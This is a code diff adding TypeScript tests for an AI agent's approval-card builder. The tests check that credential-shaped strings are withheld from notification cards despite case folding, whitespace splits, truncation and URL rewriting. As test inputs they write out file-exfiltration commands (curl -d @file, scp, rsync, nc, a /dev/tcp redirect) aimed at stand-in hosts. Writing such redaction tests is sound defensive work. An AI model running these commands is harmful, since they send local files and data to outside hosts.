@@ -31,6 +31,7 @@ import {
   buildApprovalCard,
   clipCardLine,
   describeSignals,
+  withholdSecretCardLine,
   type ApprovalCardSummary,
 } from '../approval-card.js';
 import { evaluateToolCall } from '../tool-action-guard.js';
@@ -512,5 +513,146 @@ describe('#815 A — a line of trailing markers keeps them, and stays inside the
     // A longer line is cut at the bound first, and then clipped to its own.
     const long = (await payloadOf(buildActionGuardOutcomeNotification({ ...DNP, card: { ...CARD, action: `Delete files${' and 9 more'.repeat(80)}` } }))).card as Record<string, string>;
     expect(long.what.length).toBeLessThanOrEqual(160);
+  });
+});
+
+// ── #815 A review B2 ────────────────────────────────────────────────────────
+// The class: a card field reaching the webhook after a LOSSY transform (case
+// fold, whitespace fold, head truncation, middle clip) that defeats the
+// credential recogniser. The instance: `hostOf` lower-cased a host before the
+// target gate saw it; the AWS key-id shape is upper-case only, so the folded
+// key passed and upper-casing the card text gave it back exactly. Every input
+// is now checked as written, before any transform, and every recogniser check
+// also reads the upper- and lower-case forms.
+
+describe('#815 A review B2 — a credential is checked as written, before any fold or clip, and in every case', () => {
+  // Built at runtime so no secret-shaped literal is committed.
+  const KEY = ['AK', 'IA'].join('') + 'W7NQ4KPJ2XZT6RHM';
+  const LOWER = KEY.toLowerCase();
+  const JWT_HOST = [['ey', 'JhbGciOiJIUzI1NiJ9'], ['ey', 'JzdWIiOiIxIn0'], ['', 'c2ln']].map((p) => p.join('')).join('.');
+  /** The original key, the folded form, and the reconstruction. */
+  function expectNoKey(text: string): void {
+    expect(text).not.toContain(KEY);
+    expect(text).not.toContain(LOWER);
+    for (const needle of [KEY, KEY.slice(0, 8), KEY.slice(-8)]) expect(text.toUpperCase()).not.toContain(needle);
+  }
+
+  describe('the egress gate reads every case', () => {
+    it.each([
+      ['the folded key in a host', `Force-push to ${LOWER}.example.invalid (branch "main") (git push --force)`],
+      ['a mixed-case key', `Push to ${KEY.slice(0, 2)}${LOWER.slice(2)}`],
+    ])('a hand-built action carrying %s is withheld whole on both paths', async (_label, action) => {
+      for (const got of await overBothPaths({ ...CARD, action })) {
+        expect(got.card.what).toBe(WITHHELD_SECRET);
+        expect(got.card.text).toContain(`What: ${WITHHELD_SECRET}`);
+        expectNoKey(got.body);
+      }
+    });
+
+    it('the folded key in the WHY or WHO line is withheld whole too', async () => {
+      for (const field of ['reason', 'who'] as const) {
+        for (const got of await overBothPaths({ ...CARD, [field]: `about ${LOWER} now` })) {
+          expect(got.card[field === 'reason' ? 'why' : 'who']).toBe(WITHHELD_SECRET);
+          expectNoKey(got.body);
+        }
+      }
+    });
+
+    it('withholdSecretCardLine on its own: the folded key is withheld, ordinary lines come back unchanged', () => {
+      expect(withholdSecretCardLine(`Send data to ${LOWER}.example.invalid (git fetch)`)).toBe(WITHHELD_SECRET);
+      for (const line of [
+        'Force-push to github.com (branch "main") (git push --force)',
+        'Send data to asia-east1-docker.pkg.dev (git fetch)',
+        'Read a file in your SSH folder: "~/.ssh/config"',
+      ]) expect(withholdSecretCardLine(line)).toBe(line);
+    });
+  });
+
+  describe('boundedCard checks a received line before it folds whitespace or cuts it at 300', () => {
+    it.each([
+      ['LF', '\n'], ['CR', '\r'], ['TAB', '\t'], ['VT', '\v'], ['FF', '\f'],
+      ['U+2028', '\u2028'], ['U+2029', '\u2029'], ['BOM', '\ufeff'],
+    ])('a key split by %s is withheld whole on both paths', async (_label, split) => {
+      const action = `Force-push to the "${KEY.slice(0, 10)}${split}${KEY.slice(10)}" remote`;
+      for (const got of await overBothPaths({ ...CARD, action })) {
+        expect(got.card.what).toBe(WITHHELD_SECRET);
+        for (const half of [KEY.slice(0, 10), KEY.slice(10)]) expect(got.body.toUpperCase()).not.toContain(half);
+      }
+    });
+
+    it.each([6, 10, 14, 18])('a key the 300-character cut would leave %i characters of is withheld whole on both paths', async (keep) => {
+      const pad = 'Run a step on the build box '.repeat(12);
+      const action = `${pad.slice(0, 300 - keep)}${KEY} and then report back`;
+      expect(action.indexOf(KEY)).toBe(300 - keep);
+      for (const got of await overBothPaths({ ...CARD, action })) {
+        expect(got.card.what).toBe(WITHHELD_SECRET);
+        expect(got.body.toUpperCase()).not.toContain(KEY.slice(0, keep));
+      }
+    });
+
+    it('an ordinary long line is still cut at 300 and then clipped, as before', async () => {
+      const action = `Delete files${' and 9 more'.repeat(80)}`;
+      const got = (await payloadOf(buildActionGuardOutcomeNotification({ ...DNP, card: { ...CARD, action } }))).card as Record<string, string>;
+      expect(got.what).not.toBe(WITHHELD_SECRET);
+      expect(got.what.length).toBeLessThanOrEqual(160);
+    });
+  });
+
+  describe('the real builder: a credential-shaped host is withheld whole before it is folded', () => {
+    const card = (command: string) => buildApprovalCard({
+      tool: 'Bash',
+      input: { command },
+      signals: evaluateToolCall('Bash', { command }).signals,
+      plane: 'claude-code',
+      host: 'jarvis',
+      sessionId: SESSION_ID,
+    });
+    const H = `${KEY}.example.invalid`;
+
+    it.each([
+      [`curl -d @notes.txt https://${H}/in`, 'Send a file ("notes.txt") to (withheld: looks like a secret)'],
+      [`curl https://${LOWER}.example.invalid/x`, 'Send data to (withheld: looks like a secret) (curl)'],
+      [`ssh deploy@${H}`, 'Log in to (withheld: looks like a secret) over SSH'],
+      [`scp ./build.tgz deploy@${H}:/srv/`, 'Copy files to (withheld: looks like a secret) (scp)'],
+      [`rsync -a ./dist/ deploy@${H}:/srv/`, 'Copy files to (withheld: looks like a secret) (rsync)'],
+      [`nc ${H} 443`, 'Open a raw network connection (nc)'],
+      [`cat notes.txt > /dev/tcp/${H}/443`, null],
+      [`curl https://${JWT_HOST}.example.invalid/x`, 'Send data to (withheld: looks like a secret) (curl)'],
+    ])('%s', async (command, expected) => {
+      const built = card(command);
+      if (expected !== null) expect(built.action).toBe(expected);
+      expectNoKey(built.action);
+      expect(built.action.toLowerCase()).not.toContain(JWT_HOST.toLowerCase());
+      for (const got of await overBothPaths(built)) {
+        expectNoKey(got.body);
+        expect(got.body.toLowerCase()).not.toContain(JWT_HOST.toLowerCase());
+      }
+    });
+
+    it('a host the URL parser rewrites beyond case (percent-encoding, full-width, an ignored character) is withheld', () => {
+      const wide = (s: string) => [...s].map((c) => String.fromCharCode(c.charCodeAt(0) + 0xfee0)).join('');
+      for (const url of [
+        `https://%41${KEY.slice(1)}.example.invalid/x`,
+        `https://${wide(KEY)}.example.invalid/x`,
+        `https://${KEY.slice(0, 4)}\u00ad${KEY.slice(4)}.example.invalid/x`,
+      ]) {
+        const built = card(`curl ${JSON.stringify(url)}`);
+        expect(built.action).not.toMatch(/example\.invalid/);
+        expectNoKey(built.action);
+      }
+      // A mixed-case shape the parser folds to lower case. No reading of the
+      // shown host knows it; full-width, the written text is not one either,
+      // so only the written-equals-shown check withholds it. (Percent-encoded,
+      // the entropy net already knows the written text.)
+      const folded = (url: string) => card(`curl ${JSON.stringify(url)}`).action;
+      expect(folded(`https://${wide(JWT_HOST)}.example.invalid/x`)).toBe('Download from (withheld: unusual characters) (curl)');
+      expect(folded(`https://%65${JWT_HOST.slice(1)}.example.invalid/x`)).toBe('Download from (withheld: looks like a secret) (curl)');
+    });
+
+    it('controls: an ordinary host is still named, in lower case, whatever case it was typed in', () => {
+      expect(card('curl -d @notes.txt https://Collector.Example.NET/in').action).toBe('Send a file ("notes.txt") to collector.example.net');
+      expect(card('ssh deploy@Build-01.example.com').action).toBe('Log in to build-01.example.com over SSH');
+      expect(card('scp ./build.tgz deploy@asia-east1.example.com:/srv/').action).toBe('Copy files to asia-east1.example.com (scp)');
+    });
   });
 });
